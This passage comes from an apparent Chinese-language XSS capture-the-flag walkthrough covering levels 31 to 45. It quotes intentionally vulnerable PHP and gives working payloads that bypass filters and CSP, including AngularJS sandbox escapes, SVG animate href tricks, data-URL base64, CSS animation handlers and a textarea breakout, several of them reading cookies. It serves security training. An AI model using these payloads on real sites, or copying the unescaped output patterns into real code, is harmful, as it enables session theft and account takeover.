    if (el && typeof el.focus === 'function') { try { el.focus(); } catch (e) {} }
  }, 50);
});
```

**通关思路：**
- 构造一个可聚焦的元素并在其 `ng-focus` 中注入表达式：
  - `$event.composedPath()` 获取事件路径数组（Chrome），最后一个元素是 `window`
  - `| orderBy: '...’` 使用过滤器语法将右侧字符串作为参数，两者结合在遍历到 `window` 时执行调用
  - 将 `alert` 赋给变量 `z`，在到达 `window` 的作用域时调用 `z(document.cookie)`，规避 Angular 对 `window` 的显式访问检查
- 由于表达式由 Angular 在模板编译时执行，不属于内联 `<script>`，因此不会被 `script-src` 拦截；聚焦由同源外部脚本触发，符合 CSP

**Payload（URL 参数编码形态）：**
```
%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x
```
或直接在输入框中粘贴（无需编码）：
```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

**执行流程：**
1. 服务端对 `search` 执行 `urldecode` 并输出到 Angular 作用域中的 `#content`，注入成为真实 DOM 元素
2. Angular 1.4.4 编译该元素的 `ng-focus` 指令，表达式就绪
3. 页面加载后外部脚本聚焦 `id=x`，触发 `ng-focus`
4. 表达式通过 `composedPath()` 与 `orderBy` 在到达 `window` 时调用 `z(document.cookie)`，弹出 Cookie

---

## Level 32: Reflected XSS (href/events blocked)

**源码分析：**
- 页面入口与模板：[level32/index.php](file:///d:/Book/XSS-Sec/level32/index.php)
  - 设置 Flag Cookie：
```php
setcookie("flag", "flag{c2f1e3b6-32f0-4f3f-9a7b-7b6c32a4f932}", time() + 3600, "/", "", false, false);
```
  - 读取输入与 WAF 检测：
```php
$search = isset($_GET['search']) ? $_GET['search'] : '';
if ($search) {
    $s = strtolower($search);
    if (preg_match('/\bon\w+\s*=/i', $s)) {
        http_response_code(400);
        die('Blocked: event handlers not allowed');
    }
    if (preg_match('/\bhref\s*=/i', $s)) {
        http_response_code(400);
        die('Blocked: href attribute not allowed');
    }
}
```
  - 反射点（未进行 HTML 转义，直接输出到页面）：
```php
<div class="message">
  <div id="content"><?php echo $search; ?></div>
</div>
```
- 关键漏洞点：
  - WAF 使用的是基于输入字符串的浅层匹配：
    - `on\w+=` 拦截内联事件属性（如 `onclick=`）
    - `href=` 拦截显式的 `href` 赋值
  - 但**不会识别 SVG/SMIL 的“动态属性赋值”语义**，例如 `<animate>` 的 `attributeName` 与 `values` 在渲染期为目标元素设置属性值，从而绕过对输入中“直接出现的 href=”的检测

**通关思路：**
- 构造 SVG 结构，使用 `<animate>` 在渲染阶段为 `<a>` 动态设置 `href`：
  - `<a>` 起初不包含 `href=`（因此 WAF 不命中）
  - `<animate attributeName=href values=javascript:alert(1)>` 在解析/动画阶段将 `href` 写入为 `javascript:alert(1)`
  - 用户点击 `<text>` 触发链接，执行 `javascript:` 代码

**Payload：**
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

**执行流程：**
1. 服务端检查输入字符串，不含 `on...=` 与 `href=`，WAF放行
2. 页面直接反射输入到 DOM，浏览器解析为 SVG
3. `<animate>` 在渲染阶段将 `<a>` 的 `href` 动态赋值为 `javascript:alert(1)`
4. 用户点击“Click me”，浏览器以 `javascript:` 伪协议执行，触发 `alert(1)`

**Flag：**
```
flag{c2f1e3b6-32f0-4f3f-9a7b-7b6c32a4f932}
```

---

## Level 33: JS URL XSS (chars blocked)

**源码分析：**
- 页面注入点在 `href="javascript:..."` 的 JavaScript URL 中，用户输入被直接拼接到 fetch 的 body 参数：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L25-L33)
```html
<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&<?php echo $q; ?>'}).finally(_=>window.location='/')">Back to Blog</a>
```
- 输入参数与字符限制（WAF）：禁止空白字符与圆括号，使用浅层正则匹配判断是否阻断：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L3-L12)
```php
$q = isset($_GET['q']) ? $_GET['q'] : '';
$blocked = false;
if ($q !== '') {
    if (preg_match('/[\s]/', $q)) $blocked = true;
    if (preg_match('/[()]/', $q)) $blocked = true;
}
```
- 正常输入示例（未触发阻断时的渲染）：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L35-L37)
```html
<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&666'}).finally(_=>window.location='/')">Back to Blog</a>
```

**通关思路：**
- 目标是在 JavaScript URL 的上下文中执行任意代码，同时满足以下限制：
  - 不能使用空格（以 `/**/` 注释替代空格）
  - 不能使用圆括号（使用隐式类型转换触发执行）
- 利用链路：
  - `'},`: 闭合前面的字符串 `'` 和对象 `}`。使用逗号 , 告诉 JS 引擎：后面还有其他的表达式需要计算
  - `x=x=>{throw/**/onerror=alert,666}`: 定义一个恶意函数 x。该函数会将全局错误处理函数 onerror 改为 alert，然后抛出异常
  - `toString=x, window+''`: 将 window.toString 指向恶意函数。当 window + '' 发生时，JS 会自动调用 toString 进行类型转换，从而执行函数
  - `,{x:'`: 开启一个新的对象，并留下一个未闭合的单引号，用来吞掉原代码中剩下的 `'}).finally(...)`，保证整段 JS 语法合法

**Payload：**
```
'},x=x=>{throw/**/onerror=alert,666},toString=x,window+'',{x:'
```

**执行流程：**
1. 用户输入被直接拼接到 JavaScript URL 的字符串中，未进行转义
2. 通过 `'} , ...` 闭合原有字符串与对象字面量，切入顶层语句
3. 箭头函数中执行 `throw/**/onerror=alert,666`：
   - 将 `alert` 绑定到异常处理器 `onerror`
   - 抛出异常 `666`，触发 `onerror(alert)` 执行
4. 通过 `toString=x` 与 `window+''` 在不使用圆括号的情况下调用该函数
5. 最终弹窗成功

**Flag：**
```
flag{33-js-url-throw-onerror}
```

---

## Level 34: CSP Bypass (report-uri token)

**源码分析：**
- CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令：[level34/index.php](file:///d:/Book/XSS-Sec/level34/index.php#L1-L8)
```php
$search = isset($_GET['search']) ? $_GET['search'] : '';
$token = isset($_GET['token']) ? $_GET['token'] : '';
header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
```
- 反射点：`search` 未转义直接输出到页面（用于观察脚本是否执行）：[level34/index.php](file:///d:/Book/XSS-Sec/level34/index.php#L20-L27)
```php
<div class="message">
  <div id="content"><?php echo $search; ?></div>
</div>
```
- 初始策略：`script-src 'self'` 禁止内联脚本，导致 `<script>alert(666)</script>` 不执行
- 关键缺陷：`token` 未经任何过滤或编码，作为 `report-uri` 的参数拼接到 CSP 中，允许注入分号与新的 CSP 指令

**通关思路（Chrome 特性）：**
- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
- 将脚本作为 `search` 反射到页面

**Payload 组合：**
- `search`：
```
%3Cscript%3Ealert%28666%29%3C%2Fscript%3E
```
- `token`：
```
;script-src-elem 'unsafe-inline'
```
- 访问示例：
```
/level34/index.php?search=%3Cscript%3Ealert%28666%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

**执行流程：**
1. 服务端返回 CSP：`default-src 'self'; script-src 'self'; report-uri /csp-report?token=<你的 token>`
2. 由于 `token` 包含分号，Chrome 将分号后的内容解析为独立 CSP 指令
3. 注入的 `script-src-elem 'unsafe-inline'` 生效，允许内联 `<script>` 标签执行
4. 页面中的反射脚本 `<script>alert(666)</script>` 被执行

**Flag：**
```
flag{34-csp-report-uri-token}
```

---

## Level 36: 隐藏广告链接反射 XSS

**源码分析：**
- 入口页按钮与隐藏广告链接（img 外层包裹 a，点击或被动触达都会携带广告编号）：[level36/index.php](file:///d:/Book/XSS-Sec/level36/index.php#L64-L71)
```php
<a class="btn" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">立即参与</a>
...
<a class="sponsor-banner" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">
  <img alt="赞助广告" src="...">
</a>
```
- 落地页反射点（未做任何转义，导致反射 XSS）：[level36/landing.php](file:///d:/Book/XSS-Sec/level36/landing.php#L30-L34)
```php
$adid = isset($_GET['adid']) ? $_GET['adid'] : '';
// ...
<span class="mono"><?php echo $adid; ?></span>   // 直接原样输出
```
- 说明：入口页用于模拟真实业务（客服与活动联动），“赞助广告”链接被隐藏（几乎不可见），但真正的漏洞触发点在落地页对 `adid` 的不安全回显。

**通关思路：**
- 通过入口页点击“立即参与”进入落地页；或直接在地址栏构造带有恶意 `adid` 的 URL。
- 将脚本作为 `adid` 传入，落地页原样输出导致执行。
- Payload（题述示例）：`&adid=<script>alert(/xss/)</script>`
- 更稳定的 URL 编码形式：
```
/level36/landing.php?adid=%3Cscript%3Ealert%28/xss/%29%3C/script%3E
```

**执行流程：**
1. 用户访问 `/level36/landing.php?adid=<payload>`。
2. 服务端读取 `$_GET['adid']` 并直接输出到页面。
3. 浏览器在渲染时解析脚本标签并执行。
4. 弹出提示框，形成反射 XSS。

**Flag：**
- 入口页设置：`flag{36-hidden-adurl-reflect-xss}`（用于关卡标识） [level36/index.php](file:///d:/Book/XSS-Sec/level36/index.php#L8)
- 落地页设置：`flag{36-landing-adid-reflect-xss}`（用于漏洞通关） [level36/landing.php](file:///d:/Book/XSS-Sec/level36/landing.php#L2-L4)

---


## Level 37: Data URL Base64 XSS

**源码分析：**
- 黑名单清洗与未转义输出：[level37/index.php](file:///d:/Book/XSS-Sec/level37/index.php#L26-L41)
```php
if (isset($_GET['content'])) {
    $content = $_GET['content'];
    $decoded = null;
    if (preg_match('/<object[^>]*\bdata\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $content, $m)) {
        $decoded = base64_decode($m[1]);
    } elseif (preg_match('/data:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $content, $m)) {
        $decoded = base64_decode($m[1]);
    }
    if ($decoded !== null) {
        echo $decoded;                    // 直接输出解码后的 HTML
    } else {
        $blacklist = [ '<script', 'javascript:', '<img', '<iframe', 'onerror', 'onclick', /* ... */ ];
        echo str_ireplace($blacklist, '', $content);   // 黑名单清洗后原样输出
    }
}
```
- 关键点：
  - 服务端对 data:text/html;base64 的内容进行提取与 Base64 解码，并将解码后的 HTML原样输出到主页面上下文。
  - 未进行任何 HTML 转义，导致脚本在主文档环境执行，可访问 document.cookie。
  - 当不匹配 data URL 时，走黑名单清洗分支，因黑名单不完整仍可被其他向量绕过。

**通关思路：**
- 使用 data 伪协议 + Base64 编码，将脚本包装在 object 的 data 属性中，服务端解码后在主页面执行。
- Payload：
```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=></object>
```
- 如果需要读取 Cookie，可将 Base64 内容替换为 `alert(document.cookie)`：
```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+></object>
```

**执行流程：**
1. 用户提交包含 object 的 data:text/html;base64 Payload。
2. 服务端匹配并 Base64 解码出 HTML，直接输出到页面。
3. 浏览器在主文档上下文解析并执行脚本。
4. 弹窗触发（如读取并显示 document.cookie）。

**Flag：**
- `flag{795f47f1-0007-41ac-bba5-cd4645bc1417}`（关卡页面设置） [level37/index.php](file:///d:/Book/XSS-Sec/level37/index.php#L1-L3)

---


## Level 38: PDF 上传与浏览 XSS

**源码分析：**
- 上传与随机重命名（不进行内容过滤/类型校验）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L20-L30)
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['pdf'])) {
    $file = $_FILES['pdf'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        $newName = bin2hex(random_bytes(8)) . '.pdf';
        $target = $uploadDir . '/' . $newName;
        move_uploaded_file($file['tmp_name'], $target);
    }
}
```
- 浏览行为直链静态文件（新标签打开 uploads 下的 .pdf）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L94-L101)
```php
<a class="btn" target="_blank" href="/level38/uploads/<?php echo urlencode($f); ?>">浏览</a>
```
- 删除功能（允许管理员或用户清理文件）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L7-L18)
```php
if (isset($_GET['delete'])) {
    $df = $_GET['delete'];
    if (preg_match('/^[a-f0-9]{16}\.pdf$/i', $df)) {
        $dp = $uploadDir . '/' . $df;
        if (is_file($dp)) unlink($dp);
    }
}
```
- Cookie 设置（用于验证与演示）：[level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L4-L5)
```php
$flagValue = 'flag{9d946110-ef69-47f7-a0a9-c54a15a7eb34}';
setcookie('flag', $flagValue, time() + 3600, '/', '', false, false);
```

**关键点：**
- 后端只做了随机重命名与后缀 .pdf 的强制，未校验上传文件内容或 MIME 类型。
- 浏览按钮直接打开同源静态资源。如果上传的是“伪装为 .pdf 的 HTML”（或 PDF/HTML polyglot），在某些环境或误配置下可能以 HTML 渲染并执行脚本。
- 一旦以同源 HTML 渲染，代码可读取并利用站点 Cookie（如 flag）进行攻击。

**通关思路：**
- 构造一个带脚本的“PDF”文件：
  - 简单方法：将 HTML 文件重命名为 .pdf，上载后直接通过“浏览”打开。
  - 进阶方法：制作 PDF/HTML polyglot，使浏览器/插件在特定环境下执行其中的 HTML/JS。
- 访问示例（随机名示意）：`/level38/uploads/b69736772bd2aba4.pdf`
- 浏览器新标签打开文件后，若以 HTML 渲染，会执行内嵌脚本并弹窗或读取 Cookie。

**Payload 示例（HTML 作为 .pdf 上传）：**
```html
<!doctype html><meta charset="utf-8"><script>alert(document.cookie)</script>
```
保存为 `xss.pdf` 上传；在历史上传列表点击“浏览”即可在新标签执行脚本。

**Flag：**
- `flag{9d946110-ef69-47f7-a0a9-c54a15a7eb34}`（通过 Cookie 设置） [level38/index.php](file:///d:/Book/XSS-Sec/level38/index.php#L4-L5)

---


## Level 39: Regex WAF Bypass（属性斜杠）

**源码分析：**
- 简单正则拦截与斜杠绕过的服务端演示：[level39/index.php](file:///d:/Book/XSS-Sec/level39/index.php#L28-L36)
```php
if (isset($_GET['html'])) {
    $html = $_GET['html'];
    $decoded = null;
    if (preg_match('/<iframe[^>]*\bsrc\s*\/?\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $html, $m)) {
        $decoded = base64_decode($m[1]);
    } elseif (preg_match('/\bdata:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $html, $m)) {
        $decoded = base64_decode($m[1]);
    }
    if ($decoded !== null) {
        echo $decoded; // 直接输出解码后的 HTML（在主页面上下文执行）
    } else {
        $pattern = '/(src|href)\s*=\s*["\']?data:/i';
        $sanitized = preg_replace($pattern, '$1=blocked:', $html);
        $sanitized = preg_replace('/\b(src|href)\s*\/\s*=/i', '$1=', $sanitized); // 归一化 src/=
        echo $sanitized;
    }
}
```
- 说明：
  - 正则 `/ (src|href)\s*=\s*["']?data:/i` 仅能匹配“常规形式”的属性书写。
  - HTML 规范允许在属性名与等号之间插入斜杠 `/`（以及空白符），浏览器仍能正确解析；此时简单正则无法匹配，从而绕过。
  - 为了让 data:text/html;base64 的脚本能读取 Cookie，服务端提取并解码 Base64，将结果直接输出到主页面上下文（参考第 37 关的修复思路）。

**通关思路：**
- 使用斜杠绕过 WAF 的匹配，并让服务端进入 Base64 解码直出分支：
```
<iframe src/="data:text/html,<script>alert('xss')</script>"></iframe>
```
- 如需读取 Cookie（flag），使用 Base64 版本并保持单行：
```
<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></iframe>
```
- 服务端识别到 data:text/html;base64 后，直接输出解码结果至主页面 DOM，脚本在同源上下文执行，可读取 `document.cookie`。

**执行流程：**
1. 用户提交包含斜杠属性的 iframe（src/="..."}）。
2. 由于斜杠存在，`/(src|href)\s*=\s*["']?data:/i` 未匹配，绕过拦截。
3. 服务端提取并 Base64 解码（或归一化 src/=），将 HTML 原样输出到页面。
4. 浏览器在主文档上下文解析并执行脚本，弹窗或读取 Cookie。

**Flag：**
- `flag{ba01cb39-1b87-4191-a8f1-f86175145b8a}`（通过 Cookie 设置） [level39/index.php](file:///d:/Book/XSS-Sec/level39/index.php#L3-L4)

---


## Level 40: 方括号字符串拼接绕过

**源码分析：**
- 基础 WAF 替换规则（仅针对点号/关键字）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L7-L8)
```php
$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
```
- 链接反射点（未进行协议白名单校验）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L30-L33)
```php
<a id="go" href="<?php echo $safe; ?>">Open Link</a>
```
- Cookie 设置（用于验证）：[level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L3-L4)
```php
$flag = 'flag{3620b714-4510-4902-874d-5b010022f1c1}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```

**关键点：**
- 服务端只替换了 `alert(` 与 `window.alert` 的连续字符串形式。
- JS 支持方括号访问与字符串拼接，`window['al'+'ert']('xss')` 在运行时动态组合出 `alert`，避开了后端规则的静态匹配。
- 由于未做协议白名单校验，`href="javascript:..."` 可直接执行 JavaScript。

**通关思路：**
- 将下述 Payload 输入到页面的 URL 输入框（href 反射处）：
```
javascript:window['al'+'ert']('xss')
```
- 点击页面上的 “Open Link” 即可在浏览器中执行，弹窗。

**执行流程：**
1. 用户输入被赋值到 `$url`，再经过基础替换得到 `$safe`。
2. 方括号+拼接的 `window['al'+'ert']('xss')` 不匹配后端的替换规则，保持原样。
3. 页面将 `$safe` 原样渲染到 `<a href="...">`。
4. 用户点击链接，浏览器执行 `javascript:` 代码，弹窗触发。

**Flag：**
- `flag{3620b714-4510-4902-874d-5b010022f1c1}`（通过 Cookie 设置） [level40/index.php](file:///d:/Book/XSS-Sec/level40/index.php#L3-L4)

---


## Level 41: 碎片字符串拼接绕过（eval/window）

**源码分析：**
- 基础 WAF（仅替换连续特征的 alert 与 window.alert）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L7-L8)
```php
$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
```
- 回显点（原样输出，允许事件属性与脚本执行）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L30-L33)
```php
<?php if ($content !== ''): ?>
    <?php echo $safe; ?>
<?php else: ?>
    <?php echo '<div>示例：&lt;img src="1" onerror="a=\'aler\';b=\'t\';window[a+b](\'xss\')"&gt;</div>'; ?>
<?php endif; ?>
```
- Cookie 设置（用于验证/取证）：[level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L3-L4)
```php
$flag = 'flag{7b0967db-5513-4b9e-890c-ce6052e2daf5}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```

**关键点：**
- 服务器仅基于特征码替换连续出现的 `alert(`、`window.alert`，对碎裂字符串无能为力。
- 在浏览器执行阶段，通过 `eval()` 或 `window[expr]` 将碎裂片段组合为可执行方法名或完整代码，规避静态特征。
- 原样回显使得事件属性（如 `onerror`）可直接作为执行点。

**通关思路：**
- 完整版（使用 eval 激活碎裂字符串）：
```
<img src="1" onerror="a='aler';b='t';c='(\'xss\')';eval(a+b+c)">
```
- 更隐蔽（使用 window 对象下标访问）：
```
<img src="1" onerror="a='aler';b='t';window[a+b]('xss')">
```
- 将上述任一 Payload 输入到页面并回显，图片加载失败触发 `onerror`，在运行时组合并执行弹窗。

**执行流程：**
1. 输入内容赋值给 `$content` 并复制到 `$safe`。
2. 基础 WAF仅替换连续的 `alert(` / `window.alert`，碎裂字符串保持原样。
3. 页面将 `$safe` 原样输出到 DOM。
4. 事件属性触发，`eval(a+b+c)` 或 `window[a+b]('xss')` 在运行时拼接并执行。

**Flag：**
- `flag{7b0967db-5513-4b9e-890c-ce6052e2daf5}`（通过 Cookie 设置） [level41/index.php](file:///d:/Book/XSS-Sec/level41/index.php#L3-L4)

---


## Level 42: 登录错误反射 XSS

**源码分析：**
- 构造 SQL 并执行查询（库和表不存在）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L20)
```php
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$dsn = 'sqlite::memory:';
$pdo = new PDO($dsn);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$sql = "SELECT id FROM admin_users WHERE username = '$username' AND password = '$password'";
$sqlShow = $sql;
$pdo->query($sql); // admin_users 不存在 -> 抛异常
```
- 错误信息与 SQL 原样回显（未做转义）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L58-L66)
```php
<div class="mono"><?php echo $error; ?></div>
<div class="mono"><?php echo $sqlShow; ?></div>  // 包含用户输入
```
- Cookie 设置（关卡标识）：[level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L4)
```php
$flag = 'flag{42-login-db-error-reflect-xss}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```

**关键点：**
- 服务端将用户输入直接拼接进 SQL 字符串，并在错误面板中原样回显；没有任何 HTML 转义。
- 由于库表不存在，查询必然抛出异常，错误面板稳定出现，且“SQL”行中包含可控的输入。
- 浏览器渲染 SQL 时会解析其中的 HTML 片段，从而执行脚本。

**通关思路：**
- 在“用户名”输入框输入：
```
<script>alert(1)</script>
```
- 提交后错误页显示异常信息与 SQL；SQL 行中嵌入的脚本被浏览器解析并执行，弹窗触发。

**执行流程：**
1. 表单提交，后端读取 `username`/`password`。
2. 组装 SQL 并执行，由于表不存在触发异常。
3. 页面原样回显 `$error` 与 `$sqlShow`（包含用户输入）。
4. 浏览器渲染 SQL，执行 `<script>` 代码。

**Flag：**
- `flag{42-login-db-error-reflect-xss}`（通过 Cookie 设置） [level42/index.php](file:///d:/Book/XSS-Sec/level42/index.php#L1-L4)

---


## Level 43: 在线客服聊天链接 XSS（人工客服点击）

**源码分析：**
- Cookie 设置（用于关卡标识/取证）：[level43/index.php](file:///d:/Book/XSS-Sec/level43/index.php#L3-L4)
```php
$flag = 'flag{8b1945c1-70bb-4289-9545-2513283b62cf}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 用户消息存储与原样回显（未做任何转义）：[level43/index.php](file:///d:/Book/XSS-Sec/level43/index.php#L63-L67)
```php
<?php foreach ($messages as $m): ?>
  <div class="msg <?php echo $m['role']; ?>">
    <div class="bubble"><?php echo $m['content']; ?></div>   // 直接输出
  </div>
<?php endforeach; ?>
```
- 人工客服工作台原样回显用户消息（提示可点击链接）：[level43/agent.php](file:///d:/Book/XSS-Sec/level43/agent.php#L37-L43)
```php
foreach ($messages as $m) {
  if ($m['role'] === 'user') {
    echo '<div class="bubble">' . $m['content'] . '</div>';  // 无转义
  }
}
```
- 漏洞点：两处回显均未进行 `htmlspecialchars` 处理；当用户消息中包含 `<a href="javascript:...">...</a>` 时，人工客服在工作台页面点击该链接会在同源上下文执行脚本，可读取 Cookie。

**通关思路：**
- 在聊天框输入一条包含恶意链接的消息，利用 `javascript:` 伪协议作为 `href`。
- 点击“转人工”打开工作台，人工客服点击该链接时即在页面内执行脚本。
- 示例将读取 Cookie 进行演示。

**Payload：**
```html
<a href="javascript:alert(document.cookie)">点击这里</a>
```
或更隐蔽的写法（文本看似正常链接）：
```html
<a href="javascript:alert('xss')">查看用户留言</a>
```

**执行流程：**
1. 用户提交消息，服务端写入会话并在 [index.php](file:///d:/Book/XSS-Sec/level43/index.php#L63-L67) 原样显示。
2. 客服点击“转人工”，打开 [agent.php](file:///d:/Book/XSS-Sec/level43/agent.php#L37-L43) 页面。
3. 工作台原样渲染用户消息中的 `<a>`，点击后以 `javascript:` 伪协议在当前页面执行。
4. 由于脚本在同源上下文运行，可访问 `document.cookie`。页面预先设置了标识 Cookie：`flag{8b1945c1-70bb-4289-9545-2513283b62cf}`。

 **Flag：**
 ```
 flag{8b1945c1-70bb-4289-9545-2513283b62cf}
 ```

## Level 44: CSS 动画事件 XSS（强黑名单）

**源码分析：**
- Cookie 设置（关卡标识）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L1-L6)
```php
$flag = 'flag{c9b87a01-c917-4923-a871-20726db044ae}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与多次解码（最多两次）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L5-L11)
```php
$input = isset($_GET['content']) ? $_GET['content'] : '';
$render = $input;
for ($i = 0; $i < 2; $i++) {
    $dec = urldecode($render);
    if ($dec === $render) break;
    $render = $dec;
}
```
- 强黑名单 WAF（移除/重写常见向量，保留 CSS 动画链）：[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L13-L19)
```php
$safe = $render;
if ($safe !== '') {
    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|object|embed)\b/i', '<blocked', $safe);
    // Do NOT block style or onanimationend to allow CSS animation payload to work
}
```
说明：
- 使用多条正则对典型 XSS 向量进行清洗与重写（如移除事件、重写 `javascript:`、阻断 `<script>` 与危险标签）。
- 不拦截 `style` 与 `onanimationend`，确保题述 CSS 动画事件链具备真实性。
- 清洗后直接输出 `$safe`，不再统一 `htmlspecialchars` 转义，以模拟真实的服务端黑名单策略。
- 触发保障（无需设置时长与次数）：页面全局定义动画参数，[level44/index.php](file:///d:/Book/XSS-Sec/level44/index.php#L29-L31)
```css
* { animation-duration: 1s; animation-iteration-count: 1; }
xss { display: inline-block; }
```
- 由于事件未在黑名单中拦截 `onanimationend`，且代码值允许任意字符串表达式，`alert(document.cookie)` 可执行。

**通关思路：**
- 构造并提交两个片段：`<style>@keyframes x{}</style>` 与 `<xss style="animation-name:x" onanimationend="...">`。
- 浏览器为 `<xss>` 元素应用动画名为 `x` 的关键帧，动画结束自动触发 `onanimationend` 中的表达式。
- 由于在主文档上下文执行，脚本可访问 `document.cookie`（Cookie 非 HttpOnly，同源路径为 `/`）。

**Payload：**
```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(document.cookie)"></xss>
```
或初始更简单版本（验证弹窗）：
```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

**执行流程：**
1. 服务端基于黑名单对输入进行清洗：移除常见事件与危险标签，保留 CSS 动画链。
2. DOM 渲染后，`<xss>` 元素应用 `animation-name:x`，在 1s 后触发 `animationend`。
3. 事件属性中的代码在同源主文档执行：`alert(document.cookie)`。
4. 成功弹出 Cookie，验证漏洞。

**Flag：**
```
flag{c9b87a01-c917-4923-a871-20726db044ae}
```

## Level 45: RCDATA Textarea Breakout XSS

**源码分析：**
- Cookie 设置（关卡标识）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L1-L6)
```php
$flag = 'flag{e68a3fb5-d813-42e3-9dc2-5a3f3ddd5ee2}';
setcookie('flag', $flag, time() + 3600, '/', '', false, false);
```
- 输入处理与最多两次 URL 解码：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L5-L12)
```php
$input = isset($_GET['content']) ? $_GET['content'] : '';
$render = $input;
for ($i = 0; $i < 2; $i++) {
  $d = urldecode($render);
  if ($d === $render) break;
  $render = $d;
}
```
- 关键分割逻辑（RCDATA 解析窗口）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L13-L22)
```php
$output = '';
if ($render !== '') {
  $pos = stripos($render, '</textarea>');
  if ($pos !== false) {
    $part1 = substr($render, 0, $pos + 11);
    $part2 = substr($render, $pos + 11);
    $output .= $part1; // RCDATA 文本段原样输出
    // ...
  }
}
```
- 执行点提取与其余转义（强黑名单，仅保留第一个 onerror IMG）：[level45/index.php](file:///d:/Book/XSS-Sec/level45/index.php#L18-L22)
```php
if (preg_match('/<img[^>]*\bonerror\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)[^>]*>/i', $part2, $m)) {
  $output .= $m[0];                           // 原样输出第一个 <img ... onerror=...>
  $rest2 = str_replace($m[0], '', $part2);
  $output .= htmlspecialchars($rest2, ENT_QUOTES); // 残余全部转义为文本
} else {
  $output .= htmlspecialchars($part2, ENT_QUOTES);
}
```
说明：
- `stripos('</textarea>')` 将输入一分为二：前半段处于 RCDATA，作为纯文本原样输出；后半段回到普通 HTML 解析上下文。
- 只保留后半段中的首个 `<img ... onerror=...>` 原样输出，且事件值既支持带引号也支持不带引号，保证题述 payload 生效。
- 其余内容统一 `htmlspecialchars(ENT_QUOTES)` 转义，彻底阻断其它标签与事件向量。

**通关思路：**
- 通过 RCDATA 的“提前终结”构造解析差异，强制浏览器在 `</textarea>` 之后将剩余的 `<img>` 作为正常标签解析。
- 借助 `src` 缺失触发 `onerror`，在主文档上下文执行事件代码。

**Payload：**
```html
<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
```

**执行流程：**
1. 服务端找到首个 `</textarea>`，将其之前的内容作为 RCDATA 文本原样输出。
2. 将其后的后半段只保留第一个 `<img ... onerror=...>` 原样输出，其余全部转义为文本。
